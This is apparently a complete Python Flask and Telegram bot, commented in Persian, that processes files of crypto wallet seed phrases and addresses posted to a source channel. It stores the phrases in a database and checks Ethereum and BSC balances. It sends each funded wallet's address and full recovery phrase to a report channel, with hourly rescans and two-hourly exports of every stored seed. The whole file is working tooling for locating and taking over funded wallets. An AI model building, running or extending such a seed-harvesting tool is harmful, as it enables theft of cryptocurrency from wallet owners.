import os
import re
import logging
import asyncio
import threading
import sqlite3
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request
from telegram import Bot, Update
from telegram.request import HTTPXRequest
from web3 import Web3

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

BOT_TOKEN = os.environ.get("BOT_TOKEN")
SOURCE_CHANNEL = -1003533610913
REPORT_CHANNEL = -1003893481541

# زمان‌بندی (دقیقه) - قابل تنظیم از Environment
HOURLY_INTERVAL_MIN = int(os.environ.get("HOURLY_INTERVAL_MIN", "60"))      # گزارش موجودی کل دیتابیس هر ۱ ساعت
EXPORT_INTERVAL_MIN = int(os.environ.get("EXPORT_INTERVAL_MIN", "120"))     # فایل دیتابیس هر ۲ ساعت

NETWORKS = {
    'ETH': 'https://eth.llamarpc.com',
    'BSC': 'https://bsc-dataseed.binance.org/',
}

DB_PATH = "wallets.db"
app = Flask(__name__)

# قفل برای جلوگیری از پردازش همزمان چند فایل
file_lock = threading.Lock()
schedule_lock = threading.Lock()


# ==================== دیتابیس ====================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS wallets (
            address TEXT PRIMARY KEY,
            seed TEXT,
            added_at TEXT
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS meta (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    conn.commit()
    conn.close()
    logging.info("Database ready")


def save_wallet(address: str, seed: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "INSERT OR IGNORE INTO wallets (address, seed, added_at) VALUES (?, ?, ?)",
        (address.lower(), seed.strip(), datetime.utcnow().isoformat())
    )
    conn.commit()
    conn.close()


def get_all_wallets():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT address, seed FROM wallets ORDER BY added_at")
    rows = c.fetchall()
    conn.close()
    return rows


def get_meta(key, default=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT value FROM meta WHERE key = ?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else default


def set_meta(key, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO meta (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()


# ==================== چک موجودی ====================
def get_wallet_total(address: str) -> dict:
    totals = {'ETH': 0.0, 'BSC': 0.0}
    for net, rpc in NETWORKS.items():
        try:
            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={'timeout': 6}))
            checksum = Web3.to_checksum_address(address.strip())
            balance = w3.eth.get_balance(checksum)
            totals[net] = float(w3.from_wei(balance, 'ether'))
        except Exception:
            continue
    return totals


# ==================== ۱. گزارش هر فایل ریپورت ====================
async def process_file_report(doc):
    """گزارش موجودی یک فایل report (بدون پیام‌های دسته)"""
    request_config = HTTPXRequest(connection_pool_size=20, pool_timeout=40.0, connect_timeout=25.0, read_timeout=40.0)
    bot = Bot(token=BOT_TOKEN, request=request_config)

    try:
        logging.info(f"[FILE] Start: {doc.file_name}")

        file = await bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        text = content.decode('utf-8', errors='ignore')

        # استخراج Phrase + Addr
        pattern = r"Phrase:\s*(.+?)\s*\|\s*Addr:\s*(0x[a-fA-F0-9]{40})"
        matches = re.findall(pattern, text, re.IGNORECASE)
        logging.info(f"[FILE] Found {len(matches)} wallets")

        if not matches:
            await bot.send_message(chat_id=REPORT_CHANNEL, text=f"❌ در `{doc.file_name}` آدرسی پیدا نشد.")
            return

        # ذخیره در دیتابیس
        for phrase, addr in matches:
            save_wallet(addr, phrase)

        # شناسه تست
        test_id_match = re.search(r"تعداد تست[:\s]*(\d+)", text)
        test_id = test_id_match.group(1) if test_id_match else "نامشخص"

        # اسکن موجودی
        file_totals = {'ETH': 0.0, 'BSC': 0.0}
        rich_wallets = []

        with ThreadPoolExecutor(max_workers=8) as executor:
            loop = asyncio.get_running_loop()
            tasks = [loop.run_in_executor(executor, get_wallet_total, addr) for _, addr in matches]
            results = await asyncio.gather(*tasks)

        for (phrase, addr), res in zip(matches, results):
            file_totals['ETH'] += res['ETH']
            file_totals['BSC'] += res['BSC']
            if res['ETH'] + res['BSC'] > 0.00001:
                rich_wallets.append({
                    'phrase': phrase.strip(),
                    'address': addr,
                    'balances': res
                })

        # گزارش نهایی فایل (ساده و تمیز)
        report = (
            f"📊 **گزارش فایل**\n"
            f"📄 `{doc.file_name}`\n"
            f"🆔 تست: `{test_id}`\n"
            f"🔢 تعداد ولت: `{len(matches)}`\n"
            f"──────────────────\n"
            f"🔹 ETH: `{file_totals['ETH']:.6f}`\n"
            f"🔹 BSC: `{file_totals['BSC']:.6f}`\n"
            f"💰 دارای موجودی: `{len(rich_wallets)}`"
        )
        await bot.send_message(chat_id=REPORT_CHANNEL, text=report, parse_mode='Markdown')

        # فقط ولت‌های دارای موجودی
        for w in rich_wallets:
            msg = f"`{w['address']}`\n🔑 `{w['phrase']}`\n"
            if w['balances']['ETH'] > 0:
                msg += f"• ETH: `{w['balances']['ETH']:.6f}`\n"
            if w['balances']['BSC'] > 0:
                msg += f"• BSC: `{w['balances']['BSC']:.6f}`\n"
            await bot.send_message(chat_id=REPORT_CHANNEL, text=msg, parse_mode='Markdown')
            await asyncio.sleep(0.4)

        logging.info(f"[FILE] Finished: {doc.file_name} | Rich: {len(rich_wallets)}")

    except Exception as e:
        logging.error(f"[FILE] Error: {e}", exc_info=True)
        try:
            await bot.send_message(chat_id=REPORT_CHANNEL, text=f"❌ خطا در فایل: {str(e)[:180]}")
        except Exception:
            pass


def run_file_processing(doc):
    if not file_lock.acquire(blocking=False):
        logging.warning("[FILE] Already processing, skip")
        return
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(process_file_report(doc))
        loop.close()
    except Exception as e:
        logging.error(f"[FILE] Thread error: {e}")
    finally:
        file_lock.release()


# ==================== ۳. گزارش ساعتی کل دیتابیس ====================
async def hourly_full_report():
    """هر ۱ ساعت: موجودی‌یابی جدید از کل دیتابیس"""
    request_config = HTTPXRequest(connection_pool_size=20, pool_timeout=40.0)
    bot = Bot(token=BOT_TOKEN, request=request_config)

    wallets = get_all_wallets()
    if not wallets:
        logging.info("[HOURLY] No wallets in DB")
        return

    logging.info(f"[HOURLY] Start full scan: {len(wallets)} wallets")

    await bot.send_message(
        chat_id=REPORT_CHANNEL,
        text=f"⏰ **گزارش ساعتی کل دیتابیس**\n🔢 تعداد ولت: `{len(wallets)}`\n📅 `{datetime.utcnow().strftime('%Y-%m-%d %H:%M')} UTC`"
    )

    totals = {'ETH': 0.0, 'BSC': 0.0}
    rich = []

    with ThreadPoolExecutor(max_workers=8) as executor:
        loop = asyncio.get_running_loop()
        tasks = [loop.run_in_executor(executor, get_wallet_total, addr) for addr, _ in wallets]
        results = await asyncio.gather(*tasks)

    for (addr, seed), res in zip(wallets, results):
        totals['ETH'] += res['ETH']
        totals['BSC'] += res['BSC']
        if res['ETH'] + res['BSC'] > 0.00001:
            rich.append({'address': addr, 'seed': seed, 'balances': res})

    report = (
        f"📊 **نتیجه گزارش ساعتی**\n"
        f"🔢 کل ولت: `{len(wallets)}`\n"
        f"──────────────────\n"
        f"🔹 ETH: `{totals['ETH']:.6f}`\n"
        f"🔹 BSC: `{totals['BSC']:.6f}`\n"
        f"💰 دارای موجودی: `{len(rich)}`"
    )
    await bot.send_message(chat_id=REPORT_CHANNEL, text=report, parse_mode='Markdown')

    for w in rich:
        msg = f"`{w['address']}`\n🔑 `{w['seed']}`\n"
        if w['balances']['ETH'] > 0:
            msg += f"• ETH: `{w['balances']['ETH']:.6f}`\n"
        if w['balances']['BSC'] > 0:
            msg += f"• BSC: `{w['balances']['BSC']:.6f}`\n"
        await bot.send_message(chat_id=REPORT_CHANNEL, text=msg, parse_mode='Markdown')
        await asyncio.sleep(0.4)

    set_meta("last_hourly", datetime.utcnow().isoformat())
    logging.info(f"[HOURLY] Finished | Rich: {len(rich)}")


# ==================== ۴. فایل دیتابیس هر ۲ ساعت ====================
async def export_database_file():
    """هر ۲ ساعت: ارسال فایل متنی کل دیتابیس"""
    request_config = HTTPXRequest(connection_pool_size=10)
    bot = Bot(token=BOT_TOKEN, request=request_config)

    wallets = get_all_wallets()
    if not wallets:
        logging.info("[EXPORT] No wallets to export")
        return

    content = f"Database Export - {datetime.utcnow().isoformat()} UTC\nTotal wallets: {len(wallets)}\n\n"
    for addr, seed in wallets:
        content += f"Phrase: {seed} | Addr: {addr}\n"

    filename = "database_full.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(content)

    await bot.send_document(
        chat_id=REPORT_CHANNEL,
        document=open(filename, "rb"),
        caption=f"📦 فایل کامل دیتابیس\nتعداد: `{len(wallets)}`\n📅 `{datetime.utcnow().strftime('%Y-%m-%d %H:%M')} UTC`"
    )
    set_meta("last_export", datetime.utcnow().isoformat())
    logging.info(f"[EXPORT] Sent | {len(wallets)} wallets")


# ==================== زمان‌بندی ====================
def scheduler_loop():
    logging.info("Scheduler started")
    while True:
        try:
            now = datetime.utcnow()

            # گزارش ساعتی
            last_hourly = get_meta("last_hourly")
            if last_hourly is None or (now - datetime.fromisoformat(last_hourly)).total_seconds() >= HOURLY_INTERVAL_MIN * 60:
                if schedule_lock.acquire(blocking=False):
                    try:
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        loop.run_until_complete(hourly_full_report())
                        loop.close()
                    finally:
                        schedule_lock.release()

            # خروجی فایل هر ۲ ساعت
            last_export = get_meta("last_export")
            if last_export is None or (now - datetime.fromisoformat(last_export)).total_seconds() >= EXPORT_INTERVAL_MIN * 60:
                if schedule_lock.acquire(blocking=False):
                    try:
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        loop.run_until_complete(export_database_file())
                        loop.close()
                    finally:
                        schedule_lock.release()

        except Exception as e:
            logging.error(f"Scheduler error: {e}")

        # هر ۳۰ ثانیه چک کن
        threading.Event().wait(30)


# ==================== شروع ====================
init_db()
threading.Thread(target=scheduler_loop, daemon=True).start()


@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json(force=True)
    update = Update.de_json(data, bot=None)

    if update and update.channel_post and update.channel_post.document:
        if update.channel_post.chat.id == SOURCE_CHANNEL:
            doc = update.channel_post.document
            logging.info(f"Webhook received: {doc.file_name}")
            t = threading.Thread(target=run_file_processing, args=(doc,), daemon=True)
            t.start()

    return "OK"


@app.route('/')
def health():
    wallets_count = len(get_all_wallets())
    return f"Bot running | DB wallets: {wallets_count}"
